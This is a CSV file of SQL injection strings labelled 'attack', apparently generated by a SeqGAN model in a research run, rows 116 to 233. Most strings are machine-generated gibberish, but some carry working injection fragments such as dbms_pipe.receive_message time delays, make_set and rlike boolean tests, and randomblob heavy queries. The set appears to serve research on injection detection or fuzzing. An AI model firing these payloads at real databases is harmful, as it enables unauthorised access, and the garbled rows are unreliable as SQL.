label,payload,family,payload_type,method,run_id,sample_index
attack,"1'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  '  )   )   from  ' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'j""  =  ""nsymas asr_nrsysabstyxe_ug_mapen_gxp_un.maep",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,116
attack,"-'  =  '""  =  ""'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,117
attack,-515886732925ippvf,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,118
attack,1'||  (  select 'chas  (  116x,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,119
attack,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'bunlynagxiesakve_",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,120
attack,"   )ab$ag""  =  ""nalmolfinabmg_ns a$'qzvzq'iv*seru=  103 k_nsecounotieensarsas alleivcounesealqeret  = z  =  ,9432,--",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,121
attack,1   (  select 9687a3596m,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,122
attack,"-7007""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,123
attack,1,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,124
attack,"1' like '%%'  )   and 3202  =  like  (  '   and ""   )    )    or   (  6485  =  1127  )  *1127 and    (    (   ""  selectchr  nt  (  '  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  '""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,125
attack,select 2223  =  )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,126
attack,,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,127
attack,"1""  ""   )    )    or    (    (   ""  =  ""   )    )    or    (    (   """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,128
attack,1'gs_p  nw' like 'u,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,129
attack,  ||chr  *  *  )_ppz  )    ,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,130
attack,1'  )   rlike   (  select   (  case when   (  2671  =  4485  )   then 1 else 0x28 end   )    )    and   (  '-'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,131
attack,1%     ,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,132
attack,"1'  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  'h  =  (   ))    )    (    (  'abcdefg'  h(  109  '   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  ')   and5333 t  char  =  select where t  =  =  select chr  =  'qqpjq',5  =  )  =  )      79  =    (  )   f",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,133
attack,   )    )   4297 null  *  )     66  )   and cok+v,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,134
attack,"15000000   ""  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""chrerivfcaseem.aom",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,135
attack,"select/vnie_pe_u79""  =  ""(     '  =  'qk  (  =  1  )  1  =  3056x",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,136
attack,")   from ma.ns as  )  9354,5ou' like 'nyp   nypersam.geip",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,137
attack,1   )    --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,138
attack,  /--,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,139
attack,"-q%""  )   or make_set  (  9354  =  9354,7185  )   and   (  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,140
attack,1%,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,141
attack,select t  )  --vz     1    =  (   )   or 3902  f  )  )    )   from )  110   9432  (  (  ||f,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,142
attack,1v    p,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,143
attack,"-5158  ='osqf'  )  3645     1  =  1r  5    (  ||ch  =  87  )  )  ""ymss""  =  =  )  || and where 3707)   2633  hchr  )  )  79  *.  )   2367  =  W$f  =' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,144
attack,select 7272  (  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,145
attack,"select asumabm   charqvp  (  ,=  51--gvucs_  n$et    (  (  101  66  =      char  =  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,146
attack,1%,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,147
attack,1 c'||  (  select ' 'osqf'  =  3645=  3455 7552  =  if 9643  )  (  #,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,148
attack,1'bhlx'  )   --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,149
attack,"-P2925hnull  (  =  adbmaibsi)yppe.r  =omer  vdqa co(    n"" like ""omer  +)   and    (  \",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,150
attack,"-4641%""   where c   5903  (  =  )  )   where r  )    =  3645  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,151
attack,1%%=   )     )    *   from dbmabnge_ntewmivvehr  =  )q    (  (  = ccouns awve_m.civeenouzchr%ez,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,152
attack,"1""  =  ""' like 'n    b$fu%67sychr",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,153
attack,-68468407  )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,154
attack,"select and    (  1  =    (  ,5000000(  8482  =  *  )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,155
attack,"1""jchar  )  #  (    )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,156
attack,1%v7471  =  4123 7007  =chr  (  )  =  )q--,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,157
attack,1,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,158
attack,"-""k'  =  't  (  =  )  =  (  )  --  )   and    )     ||ch or where 7007  )  (  select)  (  select w)    )  (  like  =    )   from 2  )b$er  (  =  )  n and end  bm   /2  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,159
attack,"select coge  )   ihappp  (  )   where where cfniounab$fn.asas t3,5    )   from masas t   from 'qipt'  )  (  select 1  *  69  =  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,160
attack,"-4889'||  (  select 'chaunb_psibtr_pepsvf    ns cokehr  *  (  *  )  )   where 7417  =    )   from er  )  (  9432  =    (    )   5  )   and select and 3707  =  )     )  ||r  )   --k""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,161
attack,"1#dvand cohr  (  109  )  \ 'osqf'  )   and and couseehr  =comseriouqphr   z   e8407  (hr  (  )cohr  =    (  4062  selectr  r  =  =    (  '||  (  select 's  ||chr  char  (  5098  )  )chr  )  ) from  )   load_file  =  )  select 8482  *  )   from f_nst3  ,db$t_maolers  =  )   from t    ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,162
attack,"-end!} where r  (  (  )  ||chahr  =    (   *bulmima t col_uns t3  =  5903alsysers and 7007  7471  (  ,5  q  =  65  '  (  *  (  =  ||chr  (  79  )  15  ||chr  =    (  select 8060 8363m 4212 1)   from and 3175    (  =  '  =  ')  )   v9687  )   8482yp",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,163
attack,"1'+  (  select 'comunerfeser/ensastalsers abms aser  d   om.geag  (  (  3645  )   fromt5 4212 $f  )  ||  =  3902 '    (  =    )   chr  =  #  =  )   from t1,abm_unass aumpexser  (  (  ,5  =  )    )   where coleun_pe  8459e  =  )  )   from  where 3018",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,164
attack,"15  101  char  =      =  || cf""  =  ""vmershchar  =   )   (  ,5  )   from raserls er  )  ' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'ap  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,165
attack,"-%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,166
attack,"-3018""   )    )     )   or 6872  =  6872 and    (    (     (  ""  =       5903  (  )  x",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,167
attack,"""   )    )    or    (    (   "",%""  =  ""nblects ce=    (  =  ||  )hr  =  )  select like  =  (  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,168
attack,"-3596'  =  '   )    ""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,169
attack,-%-%,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,170
attack,"5098select couniqde.er  char  (  2072se7046r  (  (  =  ) co' like 'unt  (  chr  )  (  select 8189  )  =  65  )  (  ,5  65  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,171
attack,selectue  (  )  7182  (  (    )  (  ||cvnt  (  like    =couxq5556  char  )  =  3645  )   4728 1  (  79  *  ),boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,172
attack,"1\where  ,5  =   omifrom",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,173
attack,"%""  selectyakniupeionmas alesipixun.nbmab_ntsasmale' where 3036  =  3036 and elt  (  1832  =  6644,6644   )    )   ||'s  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,174
attack,1--nzbpsera,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,175
attack,10  =  )  3056  )  || f,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,176
attack,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   '  h  )  ||abmiv"" like ""e  (  69  (ype  =  = or 9643  *  9(",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,177
attack,q'||  (  select 'e_mm      )   7272  =  )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,178
attack,"select    (  68,5  =  )  )   'qjle'  =  4062  )   fromk4123  *  *  (  =abdt  79,bleiv_m",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,179
attack,1%'  =  'hzx,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,180
attack,"1'  )   rlike   (  select   (  case when   (  2671  =  4485  )   then 1 else 0x28 end   )    )    and   (  '""  =  ""knasiad.asabmses ysersyas 8425 3902  =  5888  (  (    =  (  109  =  =    )   1,r or ablas case arsalle_saser  =  x",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,181
attack,select ch       )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,182
attack,"18514u     =  3645  =   5888  =    (    4212  =  )  select 9687  =  =  select andyinter_peseree  )   czfrom  )    )   vumet  ,or where t  select 7552  =  '  )   and    (    (   'bhrivn$_upp(  68  )  select and and    )  =  4297  )  || 3175kfi' like 'n.re_uns conibns  e  =  ""  ) or er  (  )  apv' like 'n.r",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,183
attack,"-2925%'qzvzq''  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  ''  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,184
attack,"14123)   whereer  69  ,and where s where +      )      )   8363se  79  =    (||chr  =  =  *  =  90  (  7182",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,185
attack,"select countion$f  =  )  (  4212  *  )   apxpenaint_serse  =   (  y  )  79  =  'ootz' 9687  _u109  load_file  79  )  )       or end or or  (  ""   )  8312  y",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,186
attack,select t  database  =  ||chr  (  109    =  (  # where 2633  pmakchar  =  ypee103  )   --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,187
attack,"1'  x  =""   )    )     =     (    (   ""(chr  =  1,   f",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,188
attack,1x5098,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,189
attack,"select 4123  =  )  ,om)",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,190
attack,"-2912'5  char  )hr  )      ||c  r  xs  (  )   6414   =  5 and  ,r  )    9354,7185)  )   f'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,191
attack,"1'||  (  select '    5333  ||(  69  =  ,5  (  )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,192
attack,"1""  )   and 2367  )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,193
attack,"1""  (  116  )   where 7427  8156  (  ),5  =ge5  (hr  chr  (  )  (  select comivechr  ser  )   +(  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,194
attack,"or 8421  (  (  (  ""  !  )  )  || cm""  =  ""nont1,)  al_upe",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,195
attack,)    )   where chr  (  select coun  =q      )   from like _maun8312  79  =  3018  (  select 4297e  =  (  101  =  5888,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,196
attack,  select counrabmeovere  (  xins ,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,197
attack,15   --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,198
attack,1'  )   and 3202  =  like  (  '3902 7552  =  109  )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,199
attack,1'  )   and t  )  -- where 3018    *  )   from r  (  (  )   om 9687  *  )(/     c,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,200
attack,"1%9687   or,)     and or 4728  )   )   and t  8482'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,201
attack,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'nak"" like ""x",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,202
attack,"-'  )   and make_set  (  4551  =  6487,6487  )   and   (  '-'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  '5158'   )    )    or 5903  =    (  'null  chrit  (  =  ""ymss""  *  101  )y  xz  79  (  =  3645  (  =  #  )   from where  umak'+  (  select 'un  (  )  ||chr  )    )  )   and #(    a  =    )   and   where kzpuermt  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,203
attack,15333hr  (  )   andou,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,204
attack,"%""_m.r  nomabter  x  (  =  ,5  =  109  =    (  )   or 7471",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,205
attack,"1""   )    )    and   (  1248  =  8705  )  *8705 and    (    (   ""'qzvzq'",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,206
attack,-'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,207
attack,"1Q""   )    )    or   (  6485  =  1127  )  *1127 and    (    (   ""  ||c  char  =  )   $P vunipom(   conmat  9607  (  =  *   7272  3455  =   2yp_peengomvctagiommakeh  =  *  )  and t  *  )  ""  selectg  =  and  )  =  )   dbm.in_phrpeakv3056u109  (  )   where 4728  )  9687  *  (  )     --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,208
attack,1%11nor t  2072 =  )1  ||ch counxe_mnt  (  =  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,209
attack,-%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,210
attack,selectcom_pese  )  (  (  =  69m  )   from r(  *  )   from t5888  (  *  )   where where conrgjf,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,211
attack,1*3056)   from a,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,212
attack,"15  )  (   ""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""5000000pqaser  char  =  109  =  3175 8363  )  7471    )   h 4728 cont  (  112  )  )   where co",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,213
attack,1r  )   where  (  8407 apse_sincer,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,214
attack,"-%'   )    )     )   or elt  (  3695  =  7995,7995  )   and    (    (     (  'selectrynser  =      9354  )   u--",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,215
attack,select like wpj   sw)  =  7182,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,216
attack,"select  or""  =  4297   (  (  *    =  4062,67  )  ||  7272    =  or likee  (  3645  )   ""    where 3902  )    ||chr  =  ||e  (  =  x  8459  )  66  8459  )  ||_ t  )  ,5  ('   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   '(  65      )   and cont  =  )  -q'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,217
attack,"1""  =  4212  )  =  (    =  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,218
attack,1%'+  (  select lqhd where 4251  =  4251 and   (  8754  =  5779  )  *5779  )  +'ns t  67chr  =yblu_n_nte  =    (     --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,219
attack,"111422"",  5098  )   ""vfvh""    --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,220
attack,1  )   from whereagzz   uwnt  (    )  a_,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,221
attack,1bm,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,222
attack,"15888  =  select or  couniomerioe_m_su' like 'eunibmeivkeerr  =  =  /  )     ,5  8459  (  --  )   bhr  (  =  4297  101  )   from 8060  like  )  )   from like7471h(  101  79  =  'ootz'ybom.de  (  9607  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,223
attack,"1""  (  1  9607  =  ||chr  (    )  --  (    h   )  )   where andy",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,224
attack,"z  'qqpjq'||chr  (  (  =  ncounte_udzehr  (  || 8407  )  =  )  8363or '  )   rlike   (  select   (  case when   (  2671  =  4485  )   then 1 else 0x28 end   )    )    and   (  '(  char  =  )  ,5  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,225
attack,%selectri,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,226
attack,"14062    *  )     ,5  )   and chr  )  =  2072 counz   fromaklt  (  7182  )   and 7046 9643  =  r  (  (  =  )  (  )  (  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,227
attack,"1      5  =    )  * 18156  =  ,null  vlfvemxqkf",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,228
attack,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,229
attack,"1%""  =  ""rp  )   where t  69  (    8060  )     ||   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,230
attack,"1"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""k  1  *  (  500000000  (  *     69h 5903  ,  =  )   from as comerux  qkfe",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,231
attack,"selectre  =  chr  (  (  )  ""gzhp""  =  )  9354,-5000000_mnatel_uz   daiuk_mnsab$ecf  hr  =    (  ||chr  (  =azpb$ab$funfpeer  neraincoserser  "" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""_guch.coupencoex'  =  'peu(  )   3455x  -ppeihreer  _mai""  =  ""rnkfnfintaleseri",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,232
attack,"1""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,233
